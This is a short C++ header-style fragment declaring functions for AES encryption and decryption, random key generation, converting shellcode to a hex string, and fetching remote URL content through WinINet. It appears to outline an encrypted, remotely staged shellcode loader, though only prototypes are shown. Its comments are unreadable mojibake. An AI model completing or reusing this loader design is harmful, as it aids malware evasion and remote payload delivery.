#include "AES.h"
#include "Base64.h"
#include <iostream>
#include <random>
#include <sstream>
#include <iomanip>
#include <Windows.h>
#include <tchar.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

//AES����
string EncryptionAES(const string& strSrc, const char* g_key, const char* g_iv);

//AES����
string DecryptionAES(const string& strSrc, const char* g_key, const char* g_iv);

//���������Կ
string random_string(size_t length);

//��char���͵�shellcodeת����string���͵�
string toHexString(unsigned char* data, size_t len);

//��ȡԶ��url����
LPSTR GetInterNetURLText(LPSTR lpcInterNetURL, unsigned char* buff);
